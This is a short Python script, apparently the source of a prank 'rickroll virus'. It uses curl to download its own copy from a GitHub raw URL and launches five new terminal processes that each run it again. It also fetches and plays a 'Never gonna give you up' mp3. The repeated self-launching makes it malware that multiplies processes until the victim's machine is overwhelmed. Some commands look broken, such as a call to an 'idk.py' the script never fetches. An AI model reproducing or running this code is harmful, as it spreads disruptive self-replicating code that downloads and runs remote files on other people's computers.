import os
from os.path import exists
import time
from playsound import playsound
import platform

def Linux():
    if not exists(os.getcwd() + "/main.py"):
        os.system("gnome-terminal -x cd " + os.getcwd())
        os.system("gnome-terminal -x curl -o main.py https://raw.githubusercontent.com/rauldhs/rickroll_virus/main/main.py")

        time.sleep(0.5)

        os.system("gnome-terminal -x python idk.py")
    else:
        for i in range(0,5):
            os.system("gnome-terminal -x cd " + os.getcwd())
            os.system("gnome-terminal -x python main.py")

        if exists(os.getcwd() + "/Never gonna give you up.mp3"):
            playsound("Never gonna give you up.mp3")
        else:
            os.system("gnome-terminal -x " + os.getcwd())
            os.system("gnome-terminal -x curl -o Never gonna give you up.mp3 https://github.com/rauldhs/rickroll_virus/blob/main/Never%20gonna%20give%20you%20up.mp3?raw=true")
        
            playsound("Never gonna give you up.mp3")
def Windows():
    if not exists(os.getcwd() + "/main.py"):
        os.system("start  /min cmd /c cd " + os.getcwd())
        os.system("start  /min cmd /c curl -o main.py https://raw.githubusercontent.com/rauldhs/rickroll_virus/main/main.py")

        time.sleep(0.5)

        os.system("start /min  cmd /c python idk.py")
    else:
        for i in range(0,5):
            os.system("start  /min cmd /c cd " + os.getcwd())
            os.system("start /min  cmd /c python main.py")

        if exists(os.getcwd() + "/Never gonna give you up.mp3"):
            playsound("Never gonna give you up.mp3")
        else:
            os.system("start  /min cmd /c cd " + os.getcwd())
            os.system("start  /min cmd /c curl -o Never gonna give you up.mp3 https://github.com/rauldhs/rickroll_virus/blob/main/Never%20gonna%20give%20you%20up.mp3?raw=true")
        
            playsound("Never gonna give you up.mp3")


if platform.system() == 'Windows':
       Windows()
elif platform.system() == 'Linux':
       Linux()


